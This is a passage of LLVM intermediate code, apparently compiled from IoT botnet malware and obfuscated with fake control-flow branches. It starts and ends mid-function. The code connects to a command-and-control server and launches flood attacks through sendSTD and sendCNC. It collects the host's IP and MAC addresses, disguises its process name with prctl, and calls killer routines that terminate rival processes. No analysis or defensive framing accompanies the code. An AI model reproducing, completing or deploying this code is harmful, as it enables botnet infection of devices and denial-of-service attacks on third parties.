  %1699 = load i8**, i8*** %12, align 8
  %1700 = getelementptr inbounds i8*, i8** %1699, i64 3
  %1701 = load i8*, i8** %1700, align 8
  %1702 = call i32 @atoi(i8* %1701) #10
  %1703 = icmp slt i32 %1702, 1
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1036
  %1704 = load i8**, i8*** %12, align 8
  %1705 = getelementptr inbounds i8*, i8** %1704, i64 1
  %1706 = load i8*, i8** %1705, align 8
  store i8* %1706, i8** %38, align 8
  %1707 = load i8**, i8*** %12, align 8
  %1708 = getelementptr inbounds i8*, i8** %1707, i64 2
  %1709 = load i8*, i8** %1708, align 8
  %1710 = call i32 @atoi(i8* %1709) #10
  store i32 %1710, i32* %39, align 4
  %1711 = load i8**, i8*** %12, align 8
  %1712 = getelementptr inbounds i8*, i8** %1711, i64 3
  %1713 = load i8*, i8** %1712, align 8
  %1714 = call i32 @atoi(i8* %1713) #10
  store i32 %1714, i32* %40, align 4
  %1715 = load i8*, i8** %38, align 8
  %1716 = call i8* @strstr(i8* %1715, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %1717 = icmp ne i8* %1716, null
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1078
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1099
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1122
  %1718 = load i32, i32* %11, align 4
  %1719 = icmp slt i32 %1718, 4
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1141
  %1720 = load i8**, i8*** %12, align 8
  %1721 = getelementptr inbounds i8*, i8** %1720, i64 2
  %1722 = load i8*, i8** %1721, align 8
  %1723 = call i32 @atoi(i8* %1722) #10
  %1724 = icmp slt i32 %1723, 1
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1185
  %1725 = load i8*, i8** %42, align 8
  %1726 = call i8* @strtok(i8* %1725, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1726, i8** %45, align 8
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1204
  %1727 = load i8*, i8** %45, align 8
  %1728 = icmp ne i8* %1727, null
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1226
  %1729 = load i8*, i8** %45, align 8
  %1730 = load i32, i32* %43, align 4
  %1731 = load i32, i32* %44, align 4
  call void @sendCNC(i8* %1729, i32 %1730, i32 %1731)
  %1732 = load i32, i32* @mainCommSock, align 4
  %1733 = call i32 @close(i32 %1732)
  call void @_exit(i32 0) #12
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1251
  %1734 = call i32 @listFork()
  %1735 = icmp ne i32 %1734, 0
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1270
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1287
  %1736 = load i8*, i8** %42, align 8
  %1737 = load i32, i32* %43, align 4
  %1738 = load i32, i32* %44, align 4
  call void @sendCNC(i8* %1736, i32 %1737, i32 %1738)
  call void @_exit(i32 0) #12
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1329
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1364
  %1739 = load i8*, i8** %49, align 8
  %1740 = icmp ne i8* %1739, null
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1383
  %1741 = load i8*, i8** %49, align 8
  %1742 = load i32, i32* %47, align 4
  %1743 = load i32, i32* %48, align 4
  call void @sendSTD(i8* %1741, i32 %1742, i32 %1743)
  %1744 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %1744, i8** %49, align 8
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1410
  %1745 = load i8**, i8*** %12, align 8
  %1746 = getelementptr inbounds i8*, i8** %1745, i64 0
  %1747 = load i8*, i8** %1746, align 8
  %1748 = call i32 @strcmp(i8* %1747, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0)) #10
  %1749 = icmp ne i32 %1748, 0
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1433
  %1750 = load i64, i64* %51, align 8
  %1751 = load i64, i64* @numpids, align 8
  %1752 = icmp ult i64 %1750, %1751
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1453
  %1753 = load i32*, i32** @pids, align 8
  %1754 = load i64, i64* %51, align 8
  %1755 = getelementptr inbounds i32, i32* %1753, i64 %1754
  %1756 = load i32, i32* %1755, align 4
  %1757 = icmp ne i32 %1756, 0
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1491
  %1758 = load i64, i64* %51, align 8
  %_ = sub i64 %1758, 1
  %gen = mul i64 %_, 1
  %1759 = add i64 %1758, 1
  store i64 %1759, i64* %51, align 8
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1513
  %1760 = load i32, i32* @mainCommSock, align 4
  %1761 = load i32, i32* %50, align 4
  %1762 = call i32 (i32, i8*, ...) @sockprintf(i32 %1760, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i32 %1761)
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1533
  %1763 = load i32, i32* @mainCommSock, align 4
  %1764 = call i32 (i32, i8*, ...) @sockprintf(i32 %1763, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i32 0, i32 0))
  br label %originalBB202
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

declare i32 @killer_kill(...) #3

declare i32 @killer_init(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4096, i32 16, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %0
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = call i32 @close(i32 %7)
  store i32 0, i32* @mainCommSock, align 4
  br label %9

; <label>:9:                                      ; preds = %6, %0
  %10 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %11 = load i8*, i8** @cncip, align 8
  %12 = call i8* @strcpy(i8* %10, i8* %11) #2
  %13 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %13, i32* @mainCommSock, align 4
  %14 = load i32, i32* @mainCommSock, align 4
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %16 = load i32, i32* @cncport, align 4
  %17 = call i32 @connectTimeout(i32 %14, i8* %15, i32 %16, i32 30)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %36, label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* @x.79
  %21 = load i32, i32* @y.80
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  store i32 1, i32* %1, align 4
  %28 = load i32, i32* @x.79
  %29 = load i32, i32* @y.80
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %53

; <label>:36:                                     ; preds = %9
  %37 = load i32, i32* @x.79
  %38 = load i32, i32* @y.80
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  store i32 0, i32* %1, align 4
  %45 = load i32, i32* @x.79
  %46 = load i32, i32* @y.80
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %53

; <label>:53:                                     ; preds = %originalBBpart24, %originalBBpart2
  %54 = load i32, i32* %1, align 4
  ret i32 %54

originalBBalteredBB:                              ; preds = %originalBB, %19
  store i32 1, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  store i32 0, i32* %1, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %213

; <label>:16:                                     ; preds = %0
  %17 = load i32, i32* @x.81
  %18 = load i32, i32* @y.82
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 16, i32 4, i1 false)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i32 0, i32 0)) #2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 53) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %2, align 4
  %33 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* %33, i32 16)
  store i32 %34, i32* %4, align 4
  %35 = load i32, i32* %4, align 4
  %36 = icmp eq i32 %35, -1
  %37 = load i32, i32* @x.81
  %38 = load i32, i32* @y.82
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %62

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.81
  %47 = load i32, i32* @y.82
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  store i32 0, i32* %1, align 4
  %54 = load i32, i32* @x.81
  %55 = load i32, i32* @y.82
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %213

; <label>:62:                                     ; preds = %originalBBpart2
  %63 = load i32, i32* @x.81
  %64 = load i32, i32* @y.82
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  store i32 16, i32* %6, align 4
  %71 = load i32, i32* %2, align 4
  %72 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %73 = call i32 @getsockname(i32 %71, %struct.sockaddr* %72, i32* %6) #2
  store i32 %73, i32* %4, align 4
  %74 = load i32, i32* %4, align 4
  %75 = icmp eq i32 %74, -1
  %76 = load i32, i32* @x.81
  %77 = load i32, i32* @y.82
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %85

; <label>:84:                                     ; preds = %originalBBpart28
  store i32 0, i32* %1, align 4
  br label %213

; <label>:85:                                     ; preds = %originalBBpart28
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  store i32 %88, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %89 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.129, i32 0, i32 0), i32 0)
  store i32 %89, i32* %7, align 4
  br label %90

; <label>:90:                                     ; preds = %127, %85
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %92 = load i32, i32* %7, align 4
  %93 = call i8* @fdgets(i8* %91, i32 4096, i32 %92)
  %94 = icmp ne i8* %93, null
  br i1 %94, label %95, label %129

; <label>:95:                                     ; preds = %90
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %97 = call i8* @strstr(i8* %96, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i32 0, i32 0)) #10
  %98 = icmp ne i8* %97, null
  br i1 %98, label %99, label %127

; <label>:99:                                     ; preds = %95
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %100, i8** %9, align 8
  br label %101

; <label>:101:                                    ; preds = %originalBBpart212, %99
  %102 = load i8*, i8** %9, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp ne i32 %104, 9
  br i1 %105, label %106, label %125

; <label>:106:                                    ; preds = %101
  %107 = load i32, i32* @x.81
  %108 = load i32, i32* @y.82
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %106
  %115 = load i8*, i8** %9, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %9, align 8
  %117 = load i32, i32* @x.81
  %118 = load i32, i32* @y.82
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %101

; <label>:125:                                    ; preds = %101
  %126 = load i8*, i8** %9, align 8
  store i8 0, i8* %126, align 1
  br label %129

; <label>:127:                                    ; preds = %95
  %128 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %128, i8 0, i64 4096, i32 16, i1 false)
  br label %90

; <label>:129:                                    ; preds = %125, %90
  %130 = load i32, i32* @x.81
  %131 = load i32, i32* @y.82
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %129
  %138 = load i32, i32* %7, align 4
  %139 = call i32 @close(i32 %138)
  %140 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %141 = load i8, i8* %140, align 16
  %142 = icmp ne i8 %141, 0
  %143 = load i32, i32* @x.81
  %144 = load i32, i32* @y.82
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %142, label %151, label %194

; <label>:151:                                    ; preds = %originalBBpart216
  %152 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %153 = bitcast %union.anon.6* %152 to [16 x i8]*
  %154 = getelementptr inbounds [16 x i8], [16 x i8]* %153, i32 0, i32 0
  %155 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %156 = call i8* @strcpy(i8* %154, i8* %155) #2
  %157 = load i32, i32* %2, align 4
  %158 = call i32 (i32, i64, ...) @ioctl(i32 %157, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %159

; <label>:159:                                    ; preds = %originalBBpart224, %151
  %160 = load i32, i32* %10, align 4
  %161 = icmp slt i32 %160, 6
  br i1 %161, label %162, label %193

; <label>:162:                                    ; preds = %159
  %163 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %164 = bitcast %union.anon.7* %163 to %struct.sockaddr*
  %165 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %164, i32 0, i32 1
  %166 = getelementptr inbounds [14 x i8], [14 x i8]* %165, i32 0, i32 0
  %167 = load i32, i32* %10, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %166, i64 %168
  %170 = load i8, i8* %169, align 1
  %171 = load i32, i32* %10, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %172
  store i8 %170, i8* %173, align 1
  br label %174

; <label>:174:                                    ; preds = %162
  %175 = load i32, i32* @x.81
  %176 = load i32, i32* @y.82
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = load i32, i32* %10, align 4
  %184 = add nsw i32 %183, 1
  store i32 %184, i32* %10, align 4
  %185 = load i32, i32* @x.81
  %186 = load i32, i32* @y.82
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart224, label %originalBB18alteredBB

originalBBpart224:                                ; preds = %originalBB18
  br label %159

; <label>:193:                                    ; preds = %159
  br label %194

; <label>:194:                                    ; preds = %193, %originalBBpart216
  %195 = load i32, i32* @x.81
  %196 = load i32, i32* @y.82
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %194
  %203 = load i32, i32* %2, align 4
  %204 = call i32 @close(i32 %203)
  %205 = load i32, i32* @x.81
  %206 = load i32, i32* @y.82
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %213

; <label>:213:                                    ; preds = %originalBBpart228, %84, %originalBBpart24, %15
  %214 = load i32, i32* @x.81
  %215 = load i32, i32* @y.82
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %213
  %222 = load i32, i32* %1, align 4
  %223 = load i32, i32* @x.81
  %224 = load i32, i32* @y.82
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret i32 %222

originalBBalteredBB:                              ; preds = %originalBB, %16
  %231 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %231, i8 0, i64 16, i32 4, i1 false)
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %232, align 4
  %233 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i32 0, i32 0)) #2
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %235 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %234, i32 0, i32 0
  store i32 %233, i32* %235, align 4
  %236 = call zeroext i16 @htons(i16 zeroext 53) #13
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %236, i16* %237, align 2
  %238 = load i32, i32* %2, align 4
  %239 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %240 = call i32 @connect(i32 %238, %struct.sockaddr* %239, i32 16)
  store i32 %240, i32* %4, align 4
  %241 = load i32, i32* %4, align 4
  %242 = icmp eq i32 %241, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  store i32 0, i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  store i32 16, i32* %6, align 4
  %243 = load i32, i32* %2, align 4
  %244 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %245 = call i32 @getsockname(i32 %243, %struct.sockaddr* %244, i32* %6) #2
  store i32 %245, i32* %4, align 4
  %246 = load i32, i32* %4, align 4
  %247 = icmp eq i32 %246, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %106
  %248 = load i8*, i8** %9, align 8
  %249 = getelementptr inbounds i8, i8* %248, i32 1
  store i8* %249, i8** %9, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %129
  %250 = load i32, i32* %7, align 4
  %251 = call i32 @close(i32 %250)
  %252 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %253 = load i8, i8* %252, align 16
  %254 = icmp ne i8 %253, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  %255 = load i32, i32* %10, align 4
  %_ = sub i32 0, %255
  %gen = add i32 %_, 1
  %_19 = sub i32 0, %255
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 %255, 1
  %gen22 = mul i32 %_21, 1
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %10, align 4
  br label %originalBB18

originalBB26alteredBB:                            ; preds = %originalBB26, %194
  %257 = load i32, i32* %2, align 4
  %258 = call i32 @close(i32 %257)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %213
  %259 = load i32, i32* %1, align 4
  br label %originalBB30
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.83
  %4 = load i32, i32* @y.84
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca [256 x i8], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %struct._IO_FILE*, align 8
  %22 = alloca [256 x i8], align 16
  %23 = alloca [1024 x i8], align 16
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca %struct._IO_FILE*, align 8
  %27 = alloca [4096 x i8], align 16
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca [1024 x i8], align 16
  %37 = alloca i32, align 4
  %38 = alloca [10 x i8*], align 16
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %14, align 8
  %42 = load i8**, i8*** %13, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  %44 = load i8*, i8** %43, align 8
  %45 = load i8**, i8*** %13, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i64 @strlen(i8* %47) #10
  %49 = call i8* @strncpy(i8* %44, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i64 %48) #2
  %50 = load i8**, i8*** %13, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %51, align 8
  %52 = load i8*, i8** %14, align 8
  %53 = ptrtoint i8* %52 to i64
  %54 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %53, i32 0, i32 0, i32 0)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = call i32 @getpid() #2
  %57 = xor i32 %55, %56
  call void @srand(i32 %57) #2
  %58 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %59 = call i32 @getpid() #2
  %60 = xor i32 %58, %59
  call void @init_rand(i32 %60)
  store i32 0, i32* %15, align 4
  %61 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.131, i32 0, i32 0))
  %62 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.132, i32 0, i32 0))
  store i32 0, i32* %16, align 4
  %63 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i32 0, i32 0), i32 2)
  store i32 %63, i32* %16, align 4
  %64 = icmp ne i32 %63, -1
  %65 = load i32, i32* @x.83
  %66 = load i32, i32* @y.84
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %64, label %76, label %73

; <label>:73:                                     ; preds = %originalBBpart2
  %74 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.134, i32 0, i32 0), i32 2)
  store i32 %74, i32* %16, align 4
